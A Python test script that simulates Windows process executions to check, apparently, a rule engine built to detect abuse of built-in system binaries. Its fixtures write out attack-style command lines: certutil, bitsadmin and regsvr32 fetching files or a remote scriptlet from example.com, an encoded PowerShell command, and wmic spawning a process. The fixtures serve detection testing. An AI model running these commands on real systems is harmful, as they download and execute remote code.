import sys
import os
import logging
from datetime import datetime

# Add parent directory to path to import from other modules
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from rules.rule_engine import RuleEngine

def setup_logging():
    """Setup logging configuration"""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        filename='lolbins_test.log'
    ) 
    # Also log to console
    console = logging.StreamHandler()
    console.setLevel(logging.INFO)
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    console.setFormatter(formatter)
    logging.getLogger('').addHandler(console)

def simulate_lolbin_execution():
    """Simulate LOLBins executions without actually running the commands"""
    
    # Initialize the rule engine
    rule_engine = RuleEngine()
    setup_logging()
    
    # List of simulated process executions to test
    test_processes = [
        {
            'name': 'certutil.exe',
            'cmdline': ['certutil.exe', '-urlcache', '-f', 'http://example.com/file.txt', 'C:\\temp\\output.txt'],
            'pid': 1001,
            'username': 'test_user'
        },
        {
            'name': 'powershell.exe',
            'cmdline': ['powershell.exe', '-encodedcommand', 'SQBFAFIAIABNAG8AdAAgAGEAIAB2AGkAcgB1AHMA'],
            'pid': 1002,
            'username': 'test_user'
        },
        {
            'name': 'regsvr32.exe',
            'cmdline': ['regsvr32.exe', '/s', '/u', '/i:http://example.com/file.sct', 'scrobj.dll'],
            'pid': 1003,
            'username': 'test_user'
        },
        {
            'name': 'wmic.exe',
            'cmdline': ['wmic.exe', 'process', 'call', 'create', 'calc.exe'],
            'pid': 1004,
            'username': 'test_user'
        },
        {
            'name': 'bitsadmin.exe',
            'cmdline': ['bitsadmin.exe', '/transfer', 'myJob', 'http://example.com/file.txt', 'C:\\temp\\output.txt'],
            'pid': 1005,
            'username': 'test_user'
        },
        # Non-malicious usage as control
        {
            'name': 'certutil.exe',
            'cmdline': ['certutil.exe', '-verify', 'certificate.cer'],
            'pid': 1006,
            'username': 'test_user'
        }
    ]
    
    # Test each simulated process
    for process in test_processes:
        logging.info(f"Testing: {' '.join(process['cmdline'])}")
        alerts = rule_engine.analyze_process(process)
        
        if alerts:
            logging.warning(f"ALERT: Found {len(alerts)} suspicious behaviors!")
            for alert in alerts:
                log_message = (
                    f"SECURITY ALERT!\n"
                    f"Rule: {alert['rule_name']}\n"
                    f"Severity: {alert['severity']}/5\n"
                    f"Description: {alert['description']}\n"
                    f"Process: {alert['process_name']} (PID: {alert['pid']})\n"
                    f"User: {alert['username']}\n"
                    f"Command: {alert['command_line']}\n"
                    f"Timestamp: {alert['timestamp']}\n"
                    f"----------------------"
                )
                logging.warning(log_message)
        else:
            logging.info(f"No suspicious behavior detected for {process['name']}")
            
        print("---\n")

if __name__ == "__main__":
    simulate_lolbin_execution()